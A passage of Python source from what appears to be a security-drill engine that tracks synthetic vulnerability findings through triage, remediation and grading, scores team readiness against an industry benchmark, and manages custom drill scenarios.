        """Signal that triage was completed with a classification."""
        raw = self._db.get_drill(drill_id)
        if not raw:
            raise ValueError(f"Drill {drill_id} not found")

        drill = self._dict_to_drill(raw)
        if drill.status not in (DrillStatus.ACTIVE, DrillStatus.DETECTED):
            raise ValueError(f"Drill {drill_id} cannot be triaged in status {drill.status.value}")

        try:
            tc = TriageClassification(classification)
        except ValueError:
            tc = TriageClassification.REAL_HIGH

        now = _utcnow_iso()
        drill.status = DrillStatus.TRIAGED
        drill.triaged_by = triaged_by
        drill.triage_classification = tc
        drill.escalated = escalated
        drill.notified_teams = notified_teams or []
        if drill.timeline.detected_at is None:
            drill.timeline.detected_at = now
        drill.timeline.triaged_at = now
        drill.timeline.add_event(
            "triaged",
            f"Classification: {tc.value}. Escalated: {escalated}. {triage_note}".strip(),
            actor=triaged_by,
        )
        self._db.save_drill(drill)
        return drill.to_dict()

    def mark_remediated(
        self,
        drill_id: str,
        remediated_by: Optional[str] = None,
        remediation_note: str = "",
    ) -> Dict[str, Any]:
        """Signal that the finding was remediated."""
        raw = self._db.get_drill(drill_id)
        if not raw:
            raise ValueError(f"Drill {drill_id} not found")

        drill = self._dict_to_drill(raw)
        now = _utcnow_iso()
        drill.status = DrillStatus.REMEDIATED
        drill.remediated_by = remediated_by
        drill.timeline.remediated_at = now
        drill.timeline.add_event(
            "remediated",
            f"Finding remediated. {remediation_note}".strip(),
            actor=remediated_by,
        )
        self._db.save_drill(drill)
        return drill.to_dict()

    def grade_drill(
        self,
        drill_id: str,
        override_detection_minutes: Optional[int] = None,
        override_remediation_minutes: Optional[int] = None,
    ) -> DrillScore:
        """
        Grade the team's response to a drill.

        Computes the 4-dimension score and persists it.
        Also generates a training sample for ML feedback loops.
        """
        raw = self._db.get_drill(drill_id)
        if not raw:
            raise ValueError(f"Drill {drill_id} not found")

        drill = self._dict_to_drill(raw)
        sc = self._get_scenario_or_raise(drill.scenario_id)

        # Compute timing from timeline
        detection_minutes = override_detection_minutes or self._compute_detection_minutes(drill)
        remediation_minutes = override_remediation_minutes or self._compute_remediation_minutes(drill)

        score = self._scorer.score(
            drill=drill,
            scenario=sc,
            detection_minutes=detection_minutes,
            triage_classification=drill.triage_classification,
            remediation_minutes=remediation_minutes,
            escalated=drill.escalated,
            team_notified=bool(drill.notified_teams or drill.detected_by),
            notified_teams=drill.notified_teams,
        )

        now = _utcnow_iso()
        drill.score = score
        drill.status = DrillStatus.GRADED
        drill.timeline.graded_at = now
        drill.timeline.add_event(
            "graded",
            f"Drill scored: overall={score.overall} grade={score.grade}",
            actor="fail-engine",
        )
        self._db.save_drill(drill)

        # Generate and persist training sample
        sample = self._training_gen.generate(drill, sc)
        self._db.save_training_sample(sample)

        logger.info(
            "FAIL drill graded: %s overall=%.2f grade=%s",
            drill_id, score.overall, score.grade,
        )
        return score

    def cancel_drill(
        self,
        drill_id: str,
        cancelled_by: Optional[str] = None,
        reason: str = "",
    ) -> Dict[str, Any]:
        """Cancel an active drill without grading."""
        raw = self._db.get_drill(drill_id)
        if not raw:
            raise ValueError(f"Drill {drill_id} not found")

        drill = self._dict_to_drill(raw)
        if drill.status in (DrillStatus.GRADED, DrillStatus.CANCELLED):
            raise ValueError(f"Drill {drill_id} is already {drill.status.value}")

        now = _utcnow_iso()
        drill.status = DrillStatus.CANCELLED
        drill.timeline.cancelled_at = now
        drill.timeline.add_event(
            "cancelled",
            f"Drill cancelled. Reason: {reason or 'not specified'}",
            actor=cancelled_by,
        )
        self._db.save_drill(drill)
        return drill.to_dict()

    def get_drill_history(
        self, org_id: str, days: int = 90
    ) -> List[Dict[str, Any]]:
        """Get historical drills for an organisation."""
        return self._db.get_drill_history(org_id, days)

    # ------------------------------------------------------------------
    # Neglect zones
    # ------------------------------------------------------------------

    def get_neglect_zones(
        self, org_id: str, threshold_days: int = NEGLECT_THRESHOLD_DAYS
    ) -> List[NeglectZone]:
        """Return all neglect zones for an organisation."""
        return self._neglect_detector.detect(org_id, threshold_days)

    def log_security_activity(
        self,
        org_id: str,
        component: str,
        activity_type: str,
        description: str = "",
        actor: Optional[str] = None,
        has_critical_data: bool = False,
    ) -> str:
        """Log a security activity event for a component."""
        return self._db.log_activity(
            org_id=org_id,
            component=component,
            activity_type=activity_type,
            description=description,
            actor=actor,
            has_critical_data=has_critical_data,
        )

    # ------------------------------------------------------------------
    # Readiness
    # ------------------------------------------------------------------

    def get_readiness_score(self, org_id: str) -> ReadinessScore:
        """Compute organisation readiness score from drill history."""
        return self._readiness_calc.calculate(org_id)

    def get_industry_comparison(self, org_id: str) -> Dict[str, Any]:
        """Compare org readiness against industry benchmark."""
        readiness = self.get_readiness_score(org_id)
        delta = readiness.benchmark_delta
        if delta >= 1.5:
            assessment = "Significantly above industry average"
        elif delta >= 0.5:
            assessment = "Above industry average"
        elif delta >= -0.5:
            assessment = "At industry average"
        elif delta >= -1.5:
            assessment = "Below industry average"
        else:
            assessment = "Significantly below industry average — urgent improvement needed"

        return {
            "org_id": org_id,
            "org_score": readiness.overall_score,
            "industry_benchmark": readiness.industry_benchmark,
            "delta": delta,
            "percentile": readiness.percentile,
            "assessment": assessment,
            "trend": readiness.trend.value,
            "dimension_comparison": {
                dim: {
                    "org": val,
                    "benchmark": readiness.industry_benchmark,
                    "delta": round(val - readiness.industry_benchmark, 2),
                }
                for dim, val in readiness.dimension_averages.items()
            },
        }

    # ------------------------------------------------------------------
    # Scenario management
    # ------------------------------------------------------------------

    def list_scenarios(self) -> List[Dict[str, Any]]:
        """List all available scenarios (built-in + custom)."""
        return self._db.get_all_scenarios()

    def create_custom_scenario(
        self,
        scenario_id: str,
        name: str,
        description: str,
        severity: str,
        synthetic_finding: Dict[str, Any],
        cwe_ids: Optional[List[str]] = None,
        mitre_techniques: Optional[List[str]] = None,
        mitre_tactics: Optional[List[str]] = None,
        expected_detection_minutes: int = 60,
        expected_triage_classification: str = "real_high",
        expected_remediation_approach: str = "",
        cvss_score: float = 7.0,
        cve_id: Optional[str] = None,
        tags: Optional[List[str]] = None,
    ) -> VulnerabilityScenario:
        """Create and persist a custom injection scenario."""
        try:
            sev = Severity(severity.lower())
        except ValueError:
            sev = Severity.HIGH

        try:
            triage_class = TriageClassification(expected_triage_classification)
        except ValueError:
            triage_class = TriageClassification.REAL_HIGH

        # Ensure synthetic_finding is marked
        finding = dict(synthetic_finding)
        finding["is_synthetic"] = True
        finding["scanner"] = "FAIL-INJECT-v2"

        sc = VulnerabilityScenario(
            scenario_id=scenario_id,
            name=name,
            description=description,
            severity=sev,
            cve_id=cve_id,
            cvss_score=cvss_score,
            cwe_ids=cwe_ids or [],
            mitre_techniques=mitre_techniques or [],
            mitre_tactics=mitre_tactics or [],
            synthetic_finding=finding,
            expected_detection_minutes=expected_detection_minutes,
            expected_triage_classification=triage_class,
            expected_remediation_approach=expected_remediation_approach,
            is_custom=True,
            tags=tags or [],
        )
        self._scenarios[scenario_id] = sc
        self._db.upsert_scenario(sc)
        logger.info("Custom FAIL scenario created: %s", scenario_id)
        return sc

    # ------------------------------------------------------------------
    # Training data
    # ------------------------------------------------------------------

    def get_training_data(
        self,
        org_id: Optional[str] = None,
        scenario_id: Optional[str] = None,
        limit: int = 1000,
    ) -> List[Dict[str, Any]]:
        """Export labeled training samples for ML feedback loops."""
        return self._db.get_training_data(org_id, scenario_id, limit)

    # ------------------------------------------------------------------
    # Health
    # ------------------------------------------------------------------

    def health(self) -> Dict[str, Any]:
        """Return engine health status."""
        scenario_count = len(self._db.get_all_scenarios())
        return {
            "status": "healthy",
            "engine_version": self.VERSION,
            "scenario_count": scenario_count,
            "db_path": str(self._db._db_path),
        }

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _get_scenario_or_raise(self, scenario_id: str) -> VulnerabilityScenario:
        # Check in-memory cache first
        if scenario_id in self._scenarios:
            return self._scenarios[scenario_id]
        # Fall back to DB (e.g., custom scenario created in another process)
        raw = self._db.get_scenario(scenario_id)
        if raw is None:
            valid = list(self._scenarios.keys())
            raise ValueError(
                f"Unknown scenario '{scenario_id}'. Valid scenarios: {valid}"
            )
        return self._raw_to_scenario(raw)

    def _raw_to_scenario(self, raw: Dict[str, Any]) -> VulnerabilityScenario:
        try:
            sev = Severity(raw["severity"])
        except (ValueError, KeyError):
            sev = Severity.HIGH
        try:
            triage = TriageClassification(raw["expected_triage_classification"])
        except (ValueError, KeyError):
            triage = TriageClassification.REAL_HIGH
        return VulnerabilityScenario(
            scenario_id=raw["scenario_id"],
            name=raw["name"],
            description=raw["description"],
            severity=sev,
            cve_id=raw.get("cve_id"),
            cvss_score=float(raw.get("cvss_score", 7.0)),
            cwe_ids=raw.get("cwe_ids", []),
            mitre_techniques=raw.get("mitre_techniques", []),
            mitre_tactics=raw.get("mitre_tactics", []),
            synthetic_finding=raw.get("synthetic_finding", {}),
            expected_detection_minutes=int(raw.get("expected_detection_minutes", 60)),
            expected_triage_classification=triage,
            expected_remediation_approach=raw.get("expected_remediation_approach", ""),
            is_custom=bool(raw.get("is_custom", 0)),
            created_at=raw.get("created_at", _utcnow_iso()),
            tags=raw.get("tags", []),
        )

    def _dict_to_drill(self, raw: Dict[str, Any]) -> Drill:
        try:
            status = DrillStatus(raw.get("status", "active"))
        except ValueError:
            status = DrillStatus.ACTIVE
        try:
            severity = Severity(raw.get("severity", "high"))
        except ValueError:
            severity = Severity.HIGH
        tc_val = raw.get("triage_classification")
        try:
            tc = TriageClassification(tc_val) if tc_val else None
        except ValueError:
            tc = None

        # Reconstruct timeline
        tl_data = raw.get("timeline") or {}
        timeline = DrillTimeline(
            drill_id=raw["drill_id"],
            injected_at=tl_data.get("injected_at"),
            detected_at=tl_data.get("detected_at"),
            triaged_at=tl_data.get("triaged_at"),
            remediated_at=tl_data.get("remediated_at"),
            graded_at=tl_data.get("graded_at"),
            cancelled_at=tl_data.get("cancelled_at"),
            events=tl_data.get("events", []),
        )

        # Reconstruct score
        score_data = raw.get("score")
        score: Optional[DrillScore] = None
        if score_data:
            score = DrillScore(
                drill_id=raw["drill_id"],
                detection_speed=score_data.get("detection_speed", 0.0),
                triage_accuracy=score_data.get("triage_accuracy", 0.0),
                remediation_speed=score_data.get("remediation_speed", 0.0),
                communication=score_data.get("communication", 0.0),
                overall=score_data.get("overall", 0.0),
                detection_minutes_actual=score_data.get("detection_minutes_actual"),
                detection_minutes_target=score_data.get("detection_minutes_target"),
                triage_classification_actual=score_data.get("triage_classification_actual"),
                triage_classification_expected=score_data.get("triage_classification_expected"),
                remediation_minutes_actual=score_data.get("remediation_minutes_actual"),
                escalated_correctly=score_data.get("escalated_correctly", False),
                team_notified=score_data.get("team_notified", False),
                grade=score_data.get("grade", "F"),
                feedback=score_data.get("feedback", []),
            )

        return Drill(
            drill_id=raw["drill_id"],
            scenario_id=raw["scenario_id"],
            scenario_name=raw["scenario_name"],
            target_component=raw["target_component"],
            org_id=raw["org_id"],
            status=status,
            severity=severity,
            synthetic_finding_id=raw.get("synthetic_finding_id", ""),
            synthetic_finding=raw.get("synthetic_finding", {}),
            detected_by=raw.get("detected_by"),
            triaged_by=raw.get("triaged_by"),
            remediated_by=raw.get("remediated_by"),
            triage_classification=tc,
            escalated=bool(raw.get("escalated", 0)),
            notified_teams=raw.get("notified_teams", []),
            score=score,
            timeline=timeline,
            created_at=raw.get("created_at", _utcnow_iso()),
            expires_at=raw.get("expires_at", ""),
            notes=raw.get("notes", ""),
        )

    def _compute_detection_minutes(self, drill: Drill) -> Optional[int]:
        tl = drill.timeline
        if not tl.injected_at or not tl.detected_at:
            return None
        try:
            injected = datetime.fromisoformat(tl.injected_at)
            detected = datetime.fromisoformat(tl.detected_at)
            if injected.tzinfo is None:
                injected = injected.replace(tzinfo=timezone.utc)
            if detected.tzinfo is None:
                detected = detected.replace(tzinfo=timezone.utc)
            return max(0, int((detected - injected).total_seconds() / 60))
        except (ValueError, TypeError):
            return None

    def _compute_remediation_minutes(self, drill: Drill) -> Optional[int]:
        tl = drill.timeline
        if not tl.injected_at or not tl.remediated_at:
            return None
        try:
            injected = datetime.fromisoformat(tl.injected_at)
            remediated = datetime.fromisoformat(tl.remediated_at)
            if injected.tzinfo is None:
                injected = injected.replace(tzinfo=timezone.utc)
            if remediated.tzinfo is None:
                remediated = remediated.replace(tzinfo=timezone.utc)
            return max(0, int((remediated - injected).total_seconds() / 60))
        except (ValueError, TypeError):
            return None


# ---------------------------------------------------------------------------
# Module-level singleton (lazy-initialised)
# ---------------------------------------------------------------------------

_engine_instance: Optional[DrillEngine] = None


def get_drill_engine() -> DrillEngine:
    """Return the module-level DrillEngine singleton."""
    global _engine_instance
    if _engine_instance is None:
        _engine_instance = DrillEngine()
    return _engine_instance
